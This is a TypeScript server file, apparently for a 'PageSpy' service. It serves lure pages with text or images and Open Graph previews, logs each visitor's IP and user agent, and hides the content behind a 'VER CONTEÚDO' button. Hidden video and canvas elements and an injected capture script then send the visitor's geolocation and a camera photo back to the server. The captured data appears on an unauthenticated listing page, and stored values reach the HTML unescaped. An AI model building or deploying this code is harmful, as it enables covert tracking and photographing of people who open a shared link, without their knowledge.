import { zValidator } from "@hono/zod-validator";
import { Hono } from "hono";
import { raw } from "hono/html";
import { getConnInfo, handle } from "hono/vercel";
import type { PageConfig } from "next";
import fs from "node:fs";
import * as z from "zod/v4";
import { prismaClient } from "~/prisma/client";
import { requireAdminAuth } from "~/utils/auth";
import { bcryptHashProvider } from "~/utils/bcrypt";
import { signToken } from "~/utils/jwt";
import { extractTimestampFromUUIDv7 } from "~/utils/string";

export const config: PageConfig = {
  runtime: "nodejs",
};

const app = new Hono();

app.get("/", (c) => {
  return c.text("");
});

app.post(
  "/api/page-view-location",
  zValidator(
    "json",
    z.object({
      pageViewId: z.string(),
      latitude: z.string(),
      longitude: z.string(),
    }),
  ),
  async (c) => {
    const requestJson = await c.req.valid("json");

    const checkPageView = await prismaClient.pageSpyView.findUnique({
      where: {
        id: requestJson.pageViewId,
      },
      select: {
        location: true,
      },
    });

    if (checkPageView?.location) {
      return c.json({});
    }

    await prismaClient.pageSpyView.update({
      where: {
        id: requestJson.pageViewId,
      },
      data: {
        location: `${requestJson.latitude}, ${requestJson.longitude}`,
      },
    });

    return c.json({});
  },
);

app.post(
  "/api/page-view-photo",
  zValidator(
    "json",
    z.object({
      pageViewId: z.string(),
      photoBase64: z.string(),
    }),
  ),
  async (c) => {
    const requestJson = await c.req.valid("json");

    const checkPageView = await prismaClient.pageSpyView.findUnique({
      where: {
        id: requestJson.pageViewId,
      },
      select: {
        photoBase64: true,
      },
    });

    if (checkPageView?.photoBase64) {
      return c.json({});
    }

    await prismaClient.pageSpyView.update({
      where: {
        id: requestJson.pageViewId,
      },
      data: {
        photoBase64: requestJson.photoBase64,
      },
    });

    return c.json({});
  },
);

app.get(
  "/api/get-image-page/:pageSpyId",
  zValidator(
    "param",
    z.object({
      pageSpyId: z.string(),
    }),
  ),
  async (c) => {
    const { pageSpyId } = c.req.valid("param");

    const pageSpy = await prismaClient.pageSpy.findFirst({
      where: {
        id: pageSpyId,
      },
      select: {
        fileBase64: true,
      },
    });

    if (!pageSpy?.fileBase64) {
      return c.json({});
    }

    const imageBuffer = Buffer.from(pageSpy.fileBase64.split(",")[1], "base64");

    c.status(200);
    c.header("Content-Type", "image/png");
    return c.body(new Uint8Array(imageBuffer));
  },
);

app.get(
  "/api/show-page-view/:pageSpyId",
  zValidator(
    "param",
    z.object({
      pageSpyId: z.string(),
    }),
  ),
  async (c) => {
    const { pageSpyId } = c.req.valid("param");

    const pageViewData = await prismaClient.pageSpyView.findMany({
      where: {
        pageSpyId,
      },
      select: {
        id: true,
        ip: true,
        userAgent: true,
        location: true,
        photoBase64: true,
      },
      orderBy: {
        id: "desc",
      },
    });

    const htmlTableRows = pageViewData
      .map((view) => {
        const photoLink = view.photoBase64
          ? `<a href="#" onclick="openBase64Image('${view.photoBase64.replace(/'/g, "\\'")}')" target="_blank">View Photo</a>`
          : "No Photo";
        const locationLink = view.location
          ? `<a href="https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(view.location)}" target="_blank">${view.location}</a>`
          : "No Location";

        return `
        <tr>
          <td>${view.id}</td>
          <td>${extractTimestampFromUUIDv7(view.id).toISOString()}</td>
          <td>${view.ip}</td>
          <td>${view.userAgent}</td>
          <td>${locationLink}</td>
          <td>${photoLink}</td>
        </tr>
      `;
      })
      .join("");

    return c.html(`
<style>
table {
  width: 100%;
  border-collapse: collapse;
  margin: 1rem 0;
}

thead {
  background-color: #f2f2f2;
}

th, td {
  padding: 0.75rem 1rem;
  text-align: left;
  border: 1px solid #ccc;
}

th {
  font-weight: bold;
}

@media (max-width: 600px) {
  table, thead, tbody, th, td, tr {
    display: block;
    width: 100%;
  }

  thead tr {
    display: none; /* Oculta cabeçalhos em telas muito pequenas */
  }

  tr {
    margin-bottom: 1rem;
    border: 1px solid #ccc;
    padding: 0.5rem;
  }

  td {
    border: none;
    position: relative;
    padding-left: 45%;
    margin-bottom: 0.5rem;
  }

  td:before {
    content: attr(data-label); /* Mostra o nome da coluna */
    position: absolute;
    left: 1rem;
    font-weight: bold;
  }
}
</style>

<table>
  <thead>
    <tr>
      <th>ID</th>
      <th>DATA</th>
      <th>IP Address</th>
      <th>User Agent</th>
      <th>Location</th>
      <th>Photo</th>
    </tr>
  </thead>
  <tbody>
    ${htmlTableRows}
  </tbody>
</table>

<script>
  function openBase64Image(base64Data) {
    const newWindow = window.open();
    if (!newWindow) {
      alert('Não foi possível abrir a nova aba. Verifique bloqueadores de pop-up.');
      return;
    }
    newWindow.document.write('<html><head><title>Foto</title></head><body style="margin:0;">');
    newWindow.document.write('<img src="' + base64Data + '" style="max-width:100%; height:auto;" />');
    newWindow.document.write('</body></html>');
  }
</script>

`);
  },
);

// Admin Login Route
app.post(
  "/api/admin/login",
  zValidator(
    "json",
    z.object({
      email: z.email("Email inválido"),
      password: z.string().min(1, "Senha obrigatória"),
    }),
  ),
  async (c) => {
    const { email, password } = c.req.valid("json");

    try {
      // Find admin by email
      const admin = await prismaClient.admin.findUnique({
        where: { email },
      });

      if (!admin) {
        return c.json({ error: "Credenciais inválidas" }, 401);
      }

      // Verify password using bcrypt
      const isPasswordValid = await bcryptHashProvider.compareHash(
        password,
        admin.password,
      );

      if (!isPasswordValid) {
        return c.json({ error: "Credenciais inválidas" }, 401);
      }

      // Generate JWT token
      const token = signToken({
        userId: admin.id,
        email: admin.email,
        role: "admin",
      });

      return c.json({
        success: true,
        token,
        admin: {
          id: admin.id,
          name: admin.name,
          email: admin.email,
        },
      });
    } catch (error) {
      console.error("Login error:", error);
      return c.json({ error: "Erro ao fazer login" }, 500);
    }
  },
);

// Admin Verify Route (example protected route)
app.get("/api/admin/verify", async (c) => {
  const authResult = requireAdminAuth(c.req.header("authorization") || null);

  if (!authResult.authenticated) {
    return c.json({ error: authResult.error }, 401);
  }

  return c.json({
    message: "Admin verificado",
    user: {
      id: authResult.user.userId,
      email: authResult.user.email,
      role: authResult.user.role,
    },
  });
});

// List all PageSpy items (Admin only)
app.get("/api/admin/page-spy", async (c) => {
  const authResult = requireAdminAuth(c.req.header("authorization") || null);

  if (!authResult.authenticated) {
    return c.json({ error: authResult.error }, 401);
  }

  try {
    const pageSpies = await prismaClient.pageSpy.findMany({
      orderBy: {
        id: "desc",
      },
      include: {
        _count: {
          select: { views: true },
        },
      },
    });

    return c.json({ success: true, data: pageSpies });
  } catch (error) {
    console.error("Error fetching page spies:", error);
    return c.json({ error: "Erro ao buscar itens" }, 500);
  }
});

// Get single PageSpy (Admin only)
app.get("/api/admin/page-spy/:id", async (c) => {
  const authResult = requireAdminAuth(c.req.header("authorization") || null);

  if (!authResult.authenticated) {
    return c.json({ error: authResult.error }, 401);
  }

  const id = c.req.param("id");

  try {
    const pageSpy = await prismaClient.pageSpy.findUnique({
      where: { id },
      include: {
        _count: {
          select: { views: true },
        },
      },
    });

    if (!pageSpy) {
      return c.json({ error: "Item não encontrado" }, 404);
    }

    return c.json({ success: true, data: pageSpy });
  } catch (error) {
    console.error("Error fetching page spy:", error);
    return c.json({ error: "Erro ao buscar item" }, 500);
  }
});

// Create PageSpy (Admin only)
app.post(
  "/api/admin/page-spy",
  zValidator(
    "json",
    z.object({
      path: z.string().min(1, "Path obrigatório"),
      type: z.enum(["TEXT", "IMAGE"]),
      textString: z.string().optional(),
      fileBase64: z.string().optional(),
    }),
  ),
  async (c) => {
    const authResult = requireAdminAuth(c.req.header("authorization") || null);

    if (!authResult.authenticated) {
      return c.json({ error: authResult.error }, 401);
    }

    const data = c.req.valid("json");

    // Validate based on type
    if (data.type === "TEXT" && !data.textString) {
      return c.json({ error: "Texto obrigatório para tipo TEXT" }, 400);
    }

    if (data.type === "IMAGE" && !data.fileBase64) {
      return c.json({ error: "Imagem obrigatória para tipo IMAGE" }, 400);
    }

    try {
      const pageSpy = await prismaClient.pageSpy.create({
        data: {
          path: data.path,
          type: data.type,
          textString: data.textString,
          fileBase64: data.fileBase64,
        },
      });

      return c.json({ success: true, data: pageSpy });
    } catch (error: unknown) {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      if ((error as any).code === "P2002") {
        return c.json({ error: "Já existe um item com este path" }, 400);
      }
      console.error("Error creating page spy:", error);
      return c.json({ error: "Erro ao criar item" }, 500);
    }
  },
);

// Update PageSpy (Admin only)
app.put(
  "/api/admin/page-spy/:id",
  zValidator(
    "json",
    z.object({
      path: z.string().min(1, "Path obrigatório").optional(),
      type: z.enum(["TEXT", "IMAGE"]).optional(),
      textString: z.string().optional(),
      fileBase64: z.string().optional(),
    }),
  ),
  async (c) => {
    const authResult = requireAdminAuth(c.req.header("authorization") || null);

    if (!authResult.authenticated) {
      return c.json({ error: authResult.error }, 401);
    }

    const id = c.req.param("id");
    const data = c.req.valid("json");

    try {
      const pageSpy = await prismaClient.pageSpy.update({
        where: { id },
        data,
      });

      return c.json({ success: true, data: pageSpy });
    } catch (error: unknown) {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      if ((error as any).code === "P2025") {
        return c.json({ error: "Item não encontrado" }, 404);
      }
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      if ((error as any).code === "P2002") {
        return c.json({ error: "Já existe um item com este path" }, 400);
      }
      console.error("Error updating page spy:", error);
      return c.json({ error: "Erro ao atualizar item" }, 500);
    }
  },
);

// Delete PageSpy (Admin only)
app.delete("/api/admin/page-spy/:id", async (c) => {
  const authResult = requireAdminAuth(c.req.header("authorization") || null);

  if (!authResult.authenticated) {
    return c.json({ error: authResult.error }, 401);
  }

  const id = c.req.param("id");

  try {
    await prismaClient.pageSpy.delete({
      where: { id },
    });

    return c.json({ success: true, message: "Item deletado com sucesso" });
  } catch (error: unknown) {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    if ((error as any).code === "P2025") {
      return c.json({ error: "Item não encontrado" }, 404);
    }
    console.error("Error deleting page spy:", error);
    return c.json({ error: "Erro ao deletar item" }, 500);
  }
});

// Get PageSpyViews for a specific PageSpy (Admin only)
app.get("/api/admin/page-spy/:id/views", async (c) => {
  const authResult = requireAdminAuth(c.req.header("authorization") || null);

  if (!authResult.authenticated) {
    return c.json({ error: authResult.error }, 401);
  }

  const id = c.req.param("id");

  try {
    const pageSpy = await prismaClient.pageSpy.findUnique({
      where: { id },
      select: {
        id: true,
        path: true,
        type: true,
      },
    });

    if (!pageSpy) {
      return c.json({ error: "PageSpy não encontrado" }, 404);
    }

    const views = await prismaClient.pageSpyView.findMany({
      where: { pageSpyId: id },
      orderBy: { id: "desc" },
    });

    return c.json({
      success: true,
      data: {
        pageSpy,
        views,
      },
    });
  } catch (error) {
    console.error("Error fetching page spy views:", error);
    return c.json({ error: "Erro ao buscar visualizações" }, 500);
  }
});

// List all Admins (Admin only)
app.get("/api/admin/admins", async (c) => {
  const authResult = requireAdminAuth(c.req.header("authorization") || null);

  if (!authResult.authenticated) {
    return c.json({ error: authResult.error }, 401);
  }

  try {
    const admins = await prismaClient.admin.findMany({
      orderBy: {
        id: "desc",
      },
      select: {
        id: true,
        name: true,
        email: true,
        updatedAt: true,
      },
    });

    return c.json({ success: true, data: admins });
  } catch (error) {
    console.error("Error fetching admins:", error);
    return c.json({ error: "Erro ao buscar administradores" }, 500);
  }
});

// Create Admin (Admin only)
app.post(
  "/api/admin/admins",
  zValidator(
    "json",
    z.object({
      name: z.string().min(1, "Nome obrigatório"),
      email: z.email("Email inválido"),
      password: z.string().min(8, "Senha deve ter no mínimo 8 caracteres"),
    }),
  ),
  async (c) => {
    const authResult = requireAdminAuth(c.req.header("authorization") || null);

    if (!authResult.authenticated) {
      return c.json({ error: authResult.error }, 401);
    }

    const data = c.req.valid("json");

    try {
      // Hash the password
      const hashedPassword = await bcryptHashProvider.generateHash(
        data.password,
      );

      const admin = await prismaClient.admin.create({
        data: {
          name: data.name,
          email: data.email,
          password: hashedPassword,
        },
        select: {
          id: true,
          name: true,
          email: true,
          updatedAt: true,
        },
      });

      return c.json({ success: true, data: admin });
    } catch (error: unknown) {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      if ((error as any).code === "P2002") {
        return c.json({ error: "Já existe um admin com este email" }, 400);
      }
      console.error("Error creating admin:", error);
      return c.json({ error: "Erro ao criar administrador" }, 500);
    }
  },
);

// Update Admin (Admin only)
app.put(
  "/api/admin/admins/:id",
  zValidator(
    "json",
    z.object({
      name: z.string().min(1, "Nome obrigatório").optional(),
      email: z.email("Email inválido").optional(),
    }),
  ),
  async (c) => {
    const authResult = requireAdminAuth(c.req.header("authorization") || null);

    if (!authResult.authenticated) {
      return c.json({ error: authResult.error }, 401);
    }

    const id = c.req.param("id");
    const data = c.req.valid("json");

    try {
      const admin = await prismaClient.admin.update({
        where: { id },
        data,
        select: {
          id: true,
          name: true,
          email: true,
          updatedAt: true,
        },
      });

      return c.json({ success: true, data: admin });
    } catch (error: unknown) {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      if ((error as any).code === "P2025") {
        return c.json({ error: "Administrador não encontrado" }, 404);
      }
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      if ((error as any).code === "P2002") {
        return c.json({ error: "Já existe um admin com este email" }, 400);
      }
      console.error("Error updating admin:", error);
      return c.json({ error: "Erro ao atualizar administrador" }, 500);
    }
  },
);

// Delete Admin (Admin only)
app.post("/api/admin/admins/:id/delete", async (c) => {
  const authResult = requireAdminAuth(c.req.header("authorization") || null);

  if (!authResult.authenticated) {
    return c.json({ error: authResult.error }, 401);
  }

  const id = c.req.param("id");

  // Prevent deleting yourself
  if (id === authResult.user.userId) {
    return c.json({ error: "Você não pode deletar sua própria conta" }, 400);
  }

  try {
    await prismaClient.admin.delete({
      where: { id },
    });

    return c.json({
      success: true,
      message: "Administrador deletado com sucesso",
    });
  } catch (error: unknown) {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    if ((error as any).code === "P2025") {
      return c.json({ error: "Administrador não encontrado" }, 404);
    }
    console.error("Error deleting admin:", error);
    return c.json({ error: "Erro ao deletar administrador" }, 500);
  }
});

// Change Password (Admin only - can change own password)
app.post(
  "/api/admin/change-password",
  zValidator(
    "json",
    z.object({
      currentPassword: z.string().min(1, "Senha atual obrigatória"),
      newPassword: z
        .string()
        .min(8, "Nova senha deve ter no mínimo 8 caracteres"),
    }),
  ),
  async (c) => {
    const authResult = requireAdminAuth(c.req.header("authorization") || null);

    if (!authResult.authenticated) {
      return c.json({ error: authResult.error }, 401);
    }

    const data = c.req.valid("json");

    try {
      // Get current admin
      const admin = await prismaClient.admin.findUnique({
        where: { id: authResult.user.userId },
      });

      if (!admin) {
        return c.json({ error: "Administrador não encontrado" }, 404);
      }

      // Verify current password
      const isPasswordValid = await bcryptHashProvider.compareHash(
        data.currentPassword,
        admin.password,
      );

      if (!isPasswordValid) {
        return c.json({ error: "Senha atual incorreta" }, 400);
      }

      // Hash new password
      const hashedPassword = await bcryptHashProvider.generateHash(
        data.newPassword,
      );

      // Update password
      await prismaClient.admin.update({
        where: { id: authResult.user.userId },
        data: { password: hashedPassword },
      });

      return c.json({ success: true, message: "Senha alterada com sucesso" });
    } catch (error) {
      console.error("Error changing password:", error);
      return c.json({ error: "Erro ao alterar senha" }, 500);
    }
  },
);

app.get("/*", async (c) => {
  const scriptCaptureDataString = fs.readFileSync("scripts/captureData.js", {
    encoding: "utf-8",
  });

  const path = c.req.path;

  const checkPageSpy = await prismaClient.pageSpy.findUnique({
    where: {
      path,
    },
    select: {
      id: true,
      type: true,
      textString: true,
      fileBase64: true,
    },
  });

  if (!checkPageSpy) {
    return c.text("Page not found", 404);
  }

  const connInfo = getConnInfo(c);
  const requestIp =
    connInfo.remote.address || String(c.req.header("x-real-ip"));
  const requestUserAgent = String(c.req.header("user-agent"));

  console.log(
    JSON.stringify(
      {
        connInfo,
        requestIp,
        headers: c.req.header(),
      },
      null,
      2,
    ),
  );

  const pageView = await prismaClient.pageSpyView.create({
    data: {
      ip: requestIp,
      userAgent: requestUserAgent,
      pageSpy: {
        connect: {
          path,
        },
      },
    },
    select: {
      id: true,
    },
  });

  let showContent = "";
  let extraMetaTags = "";

  if (checkPageSpy.type === "TEXT") {
    showContent = `<p>${checkPageSpy.textString}</p>`;
  }

  if (checkPageSpy.type === "IMAGE") {
    extraMetaTags = `
      <meta property="og:image" content="/api/get-image-page/${checkPageSpy.id}" />
      <meta property="og:type" content="website" />
      <meta property="og:title" content="Shared Image" />
      <meta property="og:description" content="Preview Image" />
    `;

    showContent = `<img src="${checkPageSpy.fileBase64}" alt="File content" />`;
  }

  return c.html(`<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  ${extraMetaTags}

  <style>
    #video {
      display: none;
    }

    #canvas {
      display: none;
    }

    #overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      backdrop-filter: blur(3px);
      background-color: rgba(0, 0, 0, 0.50);
      display: flex;
      justify-content: center;
      align-items: center;
    }

    #captureButton {
      background-color: #2ecc71;
      font-size: 22px;
      padding: 40px;
      cursor: pointer;
      color: #000;
      border: none;
    }
  </style>
</head>
<body>
  ${showContent}

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <div id="overlay">
    <button id="captureButton">VER CONTEÚDO</button>
  </div>

  <script>
    let pageLoadId = "${pageView.id}";
    ${raw(scriptCaptureDataString)};
  </script>
</body>
</html>`);
});

export const GET = handle(app);
export const POST = handle(app);
export const PUT = handle(app);
